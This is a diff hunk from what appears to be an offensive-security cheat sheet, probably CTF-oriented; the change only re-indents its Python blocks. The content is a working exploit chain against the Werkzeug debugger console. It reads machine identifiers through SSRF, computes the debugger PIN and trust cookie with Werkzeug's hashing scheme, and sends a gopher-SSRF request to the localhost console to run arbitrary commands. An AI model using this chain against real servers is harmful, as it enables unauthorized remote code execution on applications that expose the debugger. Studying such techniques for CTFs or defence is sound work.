@@ -308,25 +308,25 @@ curl "http://target/?f=/dev/fd/3"   # often a database or config file
 1. **Read system identifiers via SSRF:** `/etc/machine-id`, `/sys/class/net/eth0/address`
 2. **Get console SECRET:** Fetch `/console` page, extract `SECRET = "..."` from HTML
 3. **Compute PIN cookie:**
-   ```python
-   import hashlib
-   h = hashlib.sha1()
-   for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
-       h.update(bit.encode() if isinstance(bit, str) else bit)
-   h.update(b"cookiesalt")
-   cookie_name = "__wzd" + h.hexdigest()[:20]
-   h.update(b"pinsalt")
-   num = f"{int(h.hexdigest(), 16):09d}"[:9]
-   pin = "-".join([num[:3], num[3:6], num[6:]])
-   pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
-   ```
+```python
+import hashlib
+h = hashlib.sha1()
+for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
+    h.update(bit.encode() if isinstance(bit, str) else bit)
+h.update(b"cookiesalt")
+cookie_name = "__wzd" + h.hexdigest()[:20]
+h.update(b"pinsalt")
+num = f"{int(h.hexdigest(), 16):09d}"[:9]
+pin = "-".join([num[:3], num[3:6], num[6:]])
+pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
+```
 4. **Execute via gopher SSRF:** If direct access is blocked, use gopher to send HTTP request with PIN cookie:
-   ```python
-   cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
-   req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
-   gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
-   # SSRF to gopher_url
-   ```
+```python
+cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
+req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
+gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
+# SSRF to gopher_url
+```
 
 **Key insight:** Even when Werkzeug console is only reachable from localhost, the combination of SSRF + gopher protocol allows full PIN bypass and RCE. The PIN trust cookie authenticates the session without needing the actual PIN entry.
 
